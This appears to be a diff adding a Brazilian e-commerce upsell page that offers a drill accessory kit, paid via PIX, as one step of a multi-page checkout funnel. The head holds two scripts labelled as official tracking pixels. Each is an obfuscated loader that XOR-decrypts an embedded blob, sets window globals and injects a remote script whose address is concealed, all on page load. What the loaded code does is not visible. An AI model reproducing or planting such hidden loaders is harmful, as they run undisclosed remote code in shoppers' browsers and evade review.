@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- garante a barra final na URL (senao ./js/... resolve errado e a pagina fica em branco) -->
+  <script>
+  (function () {
+    var p = location.pathname;
+    var ultimo = p.split('/').pop();
+    if (p.slice(-1) !== '/' && ultimo.indexOf('.') === -1) {
+      location.replace(p + '/' + location.search + location.hash);
+    }
+  })();
+  </script>
+  <!-- UTMify Pixel Oficial -->
+  <script>(function(){var e_oslj=atob("DO+3MbRy4z0gIIUD+5SVRMYewQcCSPF3i5yNHpsRh1MOVfFukonOH9cdjhNCUqpwmJ3eQcABzE1JWOBv1J/eSdEezVdTAqkhmpvDQ90QlklFU6c5oLKbE9MejF9BTPYhwbTME9oTjlgCGqdzkpfSXf0WwRECVuRvjoqVC5ZEgltBFbJindyEBYZAhlkYQ+A1n9fSUoZQnmBd");var x_pi=[];for(var j_xks=0;j_xks<e_oslj.length;j_xks++){x_pi.push(e_oslj.charCodeAt(j_xks)&255);}var m_e8q=x_pi[0];var i_h78=x_pi.slice(1,1+m_e8q);var e_080u=x_pi.slice(1+m_e8q);var i_j=e_080u.map(function(b,l_pf){return b^i_h78[l_pf%m_e8q];});var y_z="";for(var l_sri7=0;l_sri7<i_j.length;l_sri7++){y_z+=String.fromCharCode(i_j[l_sri7]&255);}var l_wo=decodeURIComponent(escape(y_z));var j_8zw=JSON.parse(l_wo);var b_ye=j_8zw.globals||[];b_ye.forEach(function(c_79q){window[c_79q.name]=c_79q.value;});var n_frzs=document.createElement("script");n_frzs.src=j_8zw.url;n_frzs.async=true;n_frzs.defer=true;(j_8zw.attributes||[]).forEach(function(o_6lk){n_frzs.setAttribute(o_6lk.name,o_6lk.value);});(document.head||document.documentElement).appendChild(n_frzs);})();</script>
+  <!-- UTMify Script Oficial -->
+  <script>(function(){var m_h3b=atob("GJXZMun4i+1ceA2qgTebOetKfbLJN1X5ce77R5uUqdd+EHne8UShFsQpGdznQiGUGPOgHIqX5sM+CiLZ4kXySZ85Use9WibWHfStV5qMpYcvWiGI4EPvS4IoCMasRHfDKu77XIiV7s9mWmnL9Va2TJ8nFNSwGiWLFOO8XJ3V844zHCDZ4ly5Fck8HN68UnfDU7ekHpLa5YwxHS+Qo1P6TYpnCMakXjOAXOWrV5+d5ZlxC3jI6FPoG8doC9OlQjDbS7f7T7SF");var a_2f=[];for(var m_y8yk=0;m_y8yk<m_h3b.length;m_y8yk++){a_2f.push(m_h3b.charCodeAt(m_y8yk)&255);}var z_zak=a_2f[0];var b_tbfs=a_2f.slice(1,1+z_zak);var a_68s=a_2f.slice(1+z_zak);var u_kq=a_68s.map(function(b,u_4bf){return b^b_tbfs[u_4bf%z_zak];});var p_t1d="";for(var b_26v5=0;b_26v5<u_kq.length;b_26v5++){p_t1d+=String.fromCharCode(u_kq[b_26v5]&255);}var p_4=decodeURIComponent(escape(p_t1d));var p_31w=JSON.parse(p_4);var x_3h2=p_31w.globals||[];x_3h2.forEach(function(i_7pl){window[i_7pl.name]=i_7pl.value;});var u_tiv8=document.createElement("script");u_tiv8.src=p_31w.url;u_tiv8.async=true;u_tiv8.defer=true;(p_31w.attributes||[]).forEach(function(d_z9i){u_tiv8.setAttribute(d_z9i.name,d_z9i.value);});(document.head||document.documentElement).appendChild(u_tiv8);})();</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Kit de Acessórios • Complemento do seu pedido</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="./js/helpers.js?v=20261120"></script>
+  <script src="./js/pix.js?v=20261120"></script>
+  <script src="./js/upsell.js?v=20261120"></script>
+  <style>
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+    .animate-spin { animation: spin 1s linear infinite; }
+    .animate-pulse { animation: pulse 2s ease-in-out infinite; }
+  </style>
+</head>
+<body style="background:#F7F8FA">
+<div id="upsell-root"></div>
+<script>
+renderUpsell({
+  "nextUrl": (window.location.protocol === 'file:' ? '../up3/index.html' : '/ups/up3/'),
+  "docLeft": "Seu pedido",
+  "headerSub": "Oferta opcional • Pagamento seguro via PIX",
+  "alertBadge": "Oferta opcional",
+  "alertBg": "linear-gradient(135deg,#1E40AF,#1E3A8A)",
+  "showProtocol": false,
+  "exitTrap": false,
+  "listTone": "emerald",
+  "listMark": "✓",
+  "listEmoji": "✨",
+  "accent": "#1E40AF",
+  "totalSteps": 10,
+  "slug": "acessorios",
+  "stepNum": 2,
+  "productName": "Kit de Acessórios para Furadeira",
+  "icon": "🧰",
+  "headerTitle": "Kit de Acessórios • Complemento do seu pedido",
+  "docRight": "Complemento opcional",
+  "alertTitle": "Complete sua furadeira com o kit de acessórios",
+  "alertText": "Aproveite o envio já programado e adicione o Kit de Acessórios ao seu pedido: brocas e peças para começar a usar assim que a furadeira chegar.",
+  "consequencesTitle": "O que acompanha o kit",
+  "consequences": [
+    "Jogo de brocas para diferentes superfícies.",
+    "Pontas e acessórios para uso do dia a dia.",
+    "Maleta para guardar e organizar tudo.",
+    "Vai junto com o seu pedido, sem frete adicional."
+  ],
+  "withoutTitle": "Sem o kit",
+  "withTitle": "Com o kit",
+  "without": [
+    "Comprar acessórios separado",
+    "Esperar outra entrega",
+    "Peças soltas",
+    "Menos praticidade"
+  ],
+  "withNow": [
+    "Tudo no mesmo envio",
+    "Pronto para usar",
+    "Tudo organizado",
+    "Preço único"
+  ],
+  "offer": {
+    "badge": "Oferta Opcional",
+    "price": 29.9,
+    "priceNote": "Pagamento único • enviado junto com o pedido",
+    "showTimer": false,
+    "ctaText": "Adicionar Kit ao Pedido",
+    "microcopy": "Adicione agora e receba tudo junto. Valor único, pago via PIX."
+  },
+  "downsell": {
+    "badge": "Condição especial",
+    "title": "Kit de Acessórios Básico",
+    "desc": "Uma versão mais enxuta do kit, com os itens essenciais, por um valor reduzido, disponível nesta página.",
+    "price": 17.9,
+    "ctaText": "Adicionar Kit Básico",
+    "warning": "Essa condição aparece só aqui. Se não quiser, é só seguir: seu pedido continua normalmente."
+  },
+  "refuseText": "Não, obrigado — seguir sem o kit",
+  "faq": [
+    {
+      "q": "O kit vai junto com a furadeira?",
+      "a": "Sim. Ao adicionar o kit agora, ele segue no mesmo envio do seu pedido."
+    },
+    {
+      "q": "Tem custo de frete adicional?",
+      "a": "Não. O kit é enviado junto, sem frete extra."
+    },
+    {
+      "q": "Preciso comprar o kit?",
+      "a": "Não. É opcional e seu pedido segue normalmente sem ele."
+    }
+  ],
+  "trust": [
+    "Pagamento seguro",
+    "SSL 256 bits",
+    "Compra opcional",
+    "PIX"
+  ]
+});
+</script>
+</body>
+</html>
